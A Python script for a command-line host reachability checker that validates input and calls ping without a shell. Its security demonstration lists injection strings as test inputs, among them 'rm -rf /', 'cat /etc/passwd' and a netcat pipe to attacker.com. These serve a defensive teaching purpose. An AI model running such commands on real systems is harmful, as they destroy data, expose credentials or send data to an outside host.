import socket
import platform
import subprocess
import re
import sys
import time
from ipaddress import ip_address, IPv4Address, IPv6Address

# SECURITY: Maximum number of hosts to check per session
MAX_CHECKS_PER_SESSION = 10

# SECURITY: Timeout values (in seconds)
SOCKET_TIMEOUT = 5
PING_TIMEOUT = 5

def validate_hostname(hostname):
    """
    Validate hostname against RFC 1123 standards.
    
    Args:
        hostname: String to validate as hostname
    
    Returns:
        Tuple of (is_valid: bool, error_message: str)
    """
    if not hostname or len(hostname) > 253:
        return False, "Hostname must be 1-253 characters"
    
    # RFC 1123 compliant hostname pattern
    # Labels separated by dots, each label 1-63 chars, alphanumeric and hyphens
    # Cannot start or end with hyphen
    hostname_pattern = re.compile(
        r'^(?!-)'                    # Cannot start with hyphen
        r'(?:[a-zA-Z0-9-]{1,63}'     # Label: 1-63 alphanumeric or hyphen
        r'(?<!-)\.)*'                # Cannot end with hyphen, followed by dot
        r'[a-zA-Z0-9-]{1,63}'        # Final label
        r'(?<!-)$'                   # Cannot end with hyphen
    )
    
    if not hostname_pattern.match(hostname):
        return False, "Invalid hostname format"
    
    # Additional security check: no suspicious patterns
    suspicious_patterns = [
        r'[;&|`$(){}\\]',           # Shell metacharacters
        r'\.\.',                     # Path traversal
        r'^\.',                      # Hidden files
        r'\s',                       # Whitespace
    ]
    
    for pattern in suspicious_patterns:
        if re.search(pattern, hostname):
            return False, "Hostname contains invalid characters"
    
    return True, None

def validate_ip_address(ip_str):
    """
    Validate IP address (IPv4 or IPv6).
    
    Args:
        ip_str: String to validate as IP address
    
    Returns:
        Tuple of (is_valid: bool, ip_object, error_message: str)
    """
    try:
        ip_obj = ip_address(ip_str)
        
        # Check for special/reserved addresses
        if ip_obj.is_loopback:
            return True, ip_obj, "Warning: Loopback address"
        
        if ip_obj.is_private:
            return True, ip_obj, "Warning: Private address"
        
        if ip_obj.is_reserved:
            return False, None, "Reserved IP address not allowed"
        
        if ip_obj.is_multicast:
            return False, None, "Multicast address not allowed"
        
        return True, ip_obj, None
        
    except ValueError:
        return False, None, "Invalid IP address format"

def validate_host_input(host_input):
    """
    Validate user input as either hostname or IP address.
    
    Args:
        host_input: User-provided string
    
    Returns:
        Tuple of (is_valid: bool, host_type: str, cleaned_input: str, warning: str)
    """
    if not host_input or not host_input.strip():
        return False, None, None, "Input cannot be empty"
    
    cleaned = host_input.strip().lower()
    
    # Check length
    if len(cleaned) > 253:
        return False, None, None, "Input too long (max 253 characters)"
    
    # Try to parse as IP address first
    is_valid_ip, ip_obj, warning = validate_ip_address(cleaned)
    if is_valid_ip:
        return True, 'ip', cleaned, warning
    
    # Try to validate as hostname
    is_valid_hostname, error = validate_hostname(cleaned)
    if is_valid_hostname:
        return True, 'hostname', cleaned, None
    
    return False, None, None, f"Invalid input: {error}"

def check_dns_resolution(hostname):
    """
    Safely check if hostname resolves to an IP address.
    Uses socket.getaddrinfo() which is safe and doesn't execute shell commands.
    
    Args:
        hostname: Validated hostname
    
    Returns:
        Tuple of (success: bool, ip_addresses: list, error_message: str)
    """
    try:
        # getaddrinfo is safe - it's a library function, not shell execution
        addr_info = socket.getaddrinfo(
            hostname, 
            None,  # port
            socket.AF_UNSPEC,  # IPv4 or IPv6
            socket.SOCK_STREAM
        )
        
        # Extract unique IP addresses
        ip_addresses = list(set([addr[4][0] for addr in addr_info]))
        
        return True, ip_addresses, None
        
    except socket.gaierror as e:
        return False, [], f"DNS resolution failed: {e}"
    except Exception as e:
        return False, [], f"Error resolving hostname: {e}"

def check_tcp_connectivity(host, port=80, timeout=SOCKET_TIMEOUT):
    """
    Check TCP connectivity to a host using socket library.
    This is SAFE - uses Python socket library, no shell commands.
    
    Args:
        host: Hostname or IP address
        port: TCP port to check (default 80)
        timeout: Connection timeout in seconds
    
    Returns:
        Tuple of (is_reachable: bool, response_time: float, error_message: str)
    """
    start_time = time.time()
    
    try:
        # Create socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        # Attempt connection
        result = sock.connect_ex((host, port))
        
        response_time = time.time() - start_time
        
        sock.close()
        
        if result == 0:
            return True, response_time, None
        else:
            return False, response_time, f"Connection failed (error code: {result})"
        
    except socket.timeout:
        response_time = time.time() - start_time
        return False, response_time, "Connection timeout"
    
    except socket.gaierror as e:
        response_time = time.time() - start_time
        return False, response_time, f"Name resolution failed: {e}"
    
    except Exception as e:
        response_time = time.time() - start_time
        return False, response_time, f"Connection error: {e}"

def safe_ping_check(host, count=4):
    """
    Perform ping check using subprocess with safe argument passing.
    SECURITY: Uses argument list (not shell=True) to prevent command injection.
    
    Args:
        host: Validated hostname or IP address
        count: Number of ping packets to send
    
    Returns:
        Tuple of (success: bool, stats: dict, error_message: str)
    """
    system = platform.system().lower()
    
    # Build command as LIST (not string) - this is the safe way
    if system == 'windows':
        command = ['ping', '-n', str(count), host]
    else:
        command = ['ping', '-c', str(count), '-W', str(PING_TIMEOUT), host]
    
    try:
        # SECURITY: shell=False (default) prevents shell injection
        # Arguments passed as list, not concatenated string
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=PING_TIMEOUT * count + 5,
            # CRITICAL: shell=False (prevent command injection)
            shell=False
        )
        
        # Parse output for statistics
        output = result.stdout
        stats = parse_ping_output(output, system)
        
        if result.returncode == 0:
            return True, stats, None
        else:
            return False, stats, "Host unreachable or ping failed"
        
    except subprocess.TimeoutExpired:
        return False, {}, "Ping operation timed out"
    
    except FileNotFoundError:
        return False, {}, "Ping command not found on system"
    
    except Exception as e:
        return False, {}, f"Ping error: {e}"

def parse_ping_output(output, system):
    """
    Parse ping command output to extract statistics.
    
    Args:
        output: Ping command output string
        system: Operating system name
    
    Returns:
        Dictionary of statistics
    """
    stats = {
        'packets_sent': 0,
        'packets_received': 0,
        'packet_loss': 0,
        'min_time': None,
        'avg_time': None,
        'max_time': None
    }
    
    try:
        if system == 'windows':
            # Parse Windows ping output
            sent_match = re.search(r'Sent = (\d+)', output)
            received_match = re.search(r'Received = (\d+)', output)
            loss_match = re.search(r'Lost = (\d+)', output)
            
            if sent_match:
                stats['packets_sent'] = int(sent_match.group(1))
            if received_match:
                stats['packets_received'] = int(received_match.group(1))
            if loss_match and sent_match:
                stats['packet_loss'] = (int(loss_match.group(1)) / int(sent_match.group(1))) * 100
            
            # Parse times
            time_match = re.search(r'Minimum = (\d+)ms, Maximum = (\d+)ms, Average = (\d+)ms', output)
            if time_match:
                stats['min_time'] = int(time_match.group(1))
                stats['max_time'] = int(time_match.group(2))
                stats['avg_time'] = int(time_match.group(3))
        
        else:
            # Parse Linux/Mac ping output
            packet_match = re.search(r'(\d+) packets transmitted, (\d+).*received, ([\d.]+)% packet loss', output)
            if packet_match:
                stats['packets_sent'] = int(packet_match.group(1))
                stats['packets_received'] = int(packet_match.group(2))
                stats['packet_loss'] = float(packet_match.group(3))
            
            # Parse times
            time_match = re.search(r'min/avg/max.*= ([\d.]+)/([\d.]+)/([\d.]+)', output)
            if time_match:
                stats['min_time'] = float(time_match.group(1))
                stats['avg_time'] = float(time_match.group(2))
                stats['max_time'] = float(time_match.group(3))
    
    except Exception:
        pass  # Return partial stats if parsing fails
    
    return stats

def perform_comprehensive_check(host):
    """
    Perform comprehensive reachability check.
    
    Args:
        host: Validated hostname or IP address
    
    Returns:
        Dictionary of results
    """
    results = {
        'host': host,
        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
        'dns': {},
        'tcp': {},
        'ping': {}
    }
    
    print(f"\n{'='*70}")
    print(f"CHECKING HOST: {host}")
    print('='*70)
    
    # Step 1: DNS Resolution (if hostname)
    print("\n1. DNS Resolution...")
    try:
        ip_address(host)
        # It's an IP address, skip DNS
        print(f"   ✓ IP address provided: {host}")
        results['dns']['type'] = 'ip'
        results['dns']['address'] = host
    except ValueError:
        # It's a hostname, resolve it
        success, ip_list, error = check_dns_resolution(host)
        if success:
            print(f"   ✓ Resolved to {len(ip_list)} address(es):")
            for ip in ip_list:
                print(f"     - {ip}")
            results['dns']['success'] = True
            results['dns']['addresses'] = ip_list
        else:
            print(f"   ✗ {error}")
            results['dns']['success'] = False
            results['dns']['error'] = error
            return results
    
    # Step 2: TCP Connectivity Check
    print("\n2. TCP Connectivity (port 80)...")
    tcp_success, response_time, tcp_error = check_tcp_connectivity(host, port=80)
    if tcp_success:
        print(f"   ✓ TCP connection successful")
        print(f"   ✓ Response time: {response_time*1000:.2f} ms")
        results['tcp']['success'] = True
        results['tcp']['response_time'] = response_time
    else:
        print(f"   ✗ {tcp_error}")
        results['tcp']['success'] = False
        results['tcp']['error'] = tcp_error
    
    # Step 3: ICMP Ping Check
    print("\n3. ICMP Ping Check...")
    ping_success, stats, ping_error = safe_ping_check(host, count=4)
    if ping_success:
        print(f"   ✓ Ping successful")
        print(f"   ✓ Packets: {stats.get('packets_sent', 0)} sent, {stats.get('packets_received', 0)} received")
        print(f"   ✓ Packet loss: {stats.get('packet_loss', 0):.1f}%")
        if stats.get('avg_time'):
            print(f"   ✓ Average time: {stats.get('avg_time'):.2f} ms")
        results['ping']['success'] = True
        results['ping']['stats'] = stats
    else:
        print(f"   ✗ {ping_error}")
        results['ping']['success'] = False
        results['ping']['error'] = ping_error
    
    return results

def display_summary(results):
    """
    Display comprehensive summary of results.
    
    Args:
        results: Dictionary of check results
    """
    print(f"\n{'='*70}")
    print("SUMMARY")
    print('='*70)
    
    print(f"\nHost: {results['host']}")
    print(f"Time: {results['timestamp']}")
    
    # Overall status
    dns_ok = results['dns'].get('success', False) or results['dns'].get('type') == 'ip'
    tcp_ok = results['tcp'].get('success', False)
    ping_ok = results['ping'].get('success', False)
    
    print(f"\nReachability Status:")
    print(f"  DNS Resolution:    {'✓ Success' if dns_ok else '✗ Failed'}")
    print(f"  TCP Connectivity:  {'✓ Success' if tcp_ok else '✗ Failed'}")
    print(f"  ICMP Ping:         {'✓ Success' if ping_ok else '✗ Failed'}")
    
    # Overall verdict
    if dns_ok and (tcp_ok or ping_ok):
        print(f"\n{'='*70}")
        print("VERDICT: HOST IS REACHABLE ✓")
        print('='*70)
    else:
        print(f"\n{'='*70}")
        print("VERDICT: HOST IS UNREACHABLE ✗")
        print('='*70)

def demonstrate_security():
    """
    Demonstrate security features and attack prevention.
    """
    print("\n" + "="*70)
    print("SECURITY DEMONSTRATION")
    print("="*70)
    
    print("\n❌ INSECURE APPROACH (command injection vulnerable):")
    print("-" * 70)
    print("If we built commands using string concatenation:")
    print("  host = input('Enter host: ')  # User enters: google.com; rm -rf /")
    print("  command = f'ping -c 4 {host}'  # Becomes: ping -c 4 google.com; rm -rf /")
    print("  os.system(command)  # EXECUTES MALICIOUS COMMAND!")
    print("\nAn attacker could execute arbitrary commands on your system!")
    
    print("\n✅ SECURE APPROACH (our implementation):")
    print("-" * 70)
    print("Our security measures:")
    
    print("\n1. INPUT VALIDATION:")
    print("   - Hostname: RFC 1123 compliant pattern matching")
    print("   - IP Address: Using ipaddress module validation")
    print("   - Reject shell metacharacters: ; & | ` $ ( ) { } \\")
    
    print("\n2. SAFE SUBPROCESS USAGE:")
    print("   - Use argument LIST, not string concatenation")
    print("   - shell=False (prevents shell interpretation)")
    print("   - Example: ['ping', '-c', '4', host] NOT 'ping -c 4 ' + host")
    
    print("\n3. LIBRARY FUNCTIONS:")
    print("   - socket.getaddrinfo() for DNS (no shell)")
    print("   - socket.connect_ex() for TCP (no shell)")
    print("   - subprocess.run() with list args (no shell)")
    
    print("\nExample attack prevention:")
    malicious_inputs = [
        "google.com; rm -rf /",
        "8.8.8.8 && cat /etc/passwd",
        "host.com | nc attacker.com 4444",
        "../../../etc/passwd",
        "$(whoami).example.com"
    ]
    
    for malicious in malicious_inputs:
        print(f"\n  Input: {malicious}")
        is_valid, host_type, cleaned, warning = validate_host_input(malicious)
        if is_valid:
            print(f"    ✗ FAILED TO BLOCK!")
        else:
            print(f"    ✓ BLOCKED: {warning}")
    
    print("\n" + "="*70)

def main():
    """Main function for secure host reachability checker"""
    print("="*70)
    print("        SECURE HOST REACHABILITY CHECKER")
    print("="*70)
    print("\nCheck if hosts are reachable using safe methods.")
    print("No shell commands are constructed from user input.")
    
    checks_performed = 0
    
    while True:
        print("\n" + "="*70)
        print("OPTIONS:")
        print("  1. Check host reachability")
        print("  2. Show security demonstration")
        print("  3. Quit")
        print("="*70)
        
        choice = input("\nSelect option: ").strip()
        
        if choice == '1':
            # Check rate limit
            if checks_performed >= MAX_CHECKS_PER_SESSION:
                print(f"\n⚠ Maximum checks per session reached ({MAX_CHECKS_PER_SESSION})")
                print("Please restart the program to perform more checks")
                continue
            
            print("\n" + "="*70)
            print("HOST REACHABILITY CHECK")
            print("="*70)
            print("\nEnter a hostname (e.g., google.com) or IP address (e.g., 8.8.8.8)")
            
            host_input = input("\nHost: ").strip()
            
            if not host_input:
                print("✗ No input provided")
                continue
            
            # Validate input
            print("\n✓ Validating input...")
            is_valid, host_type, cleaned_host, warning = validate_host_input(host_input)
            
            if not is_valid:
                print(f"✗ VALIDATION FAILED: {warning}")
                continue
            
            print(f"✓ Valid {host_type}: {cleaned_host}")
            if warning:
                print(f"⚠ {warning}")
            
            # Perform comprehensive check
            results = perform_comprehensive_check(cleaned_host)
            
            # Display summary
            display_summary(results)
            
            checks_performed += 1
            print(f"\nChecks performed this session: {checks_performed}/{MAX_CHECKS_PER_SESSION}")
        
        elif choice == '2':
            demonstrate_security()
        
        elif choice == '3':
            print("\nGoodbye!")
            break
        
        else:
            print("✗ Invalid option")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user. Goodbye!")
    except Exception as e:
        print(f"\n✗ Unexpected error: {e}")
        sys.exit(1)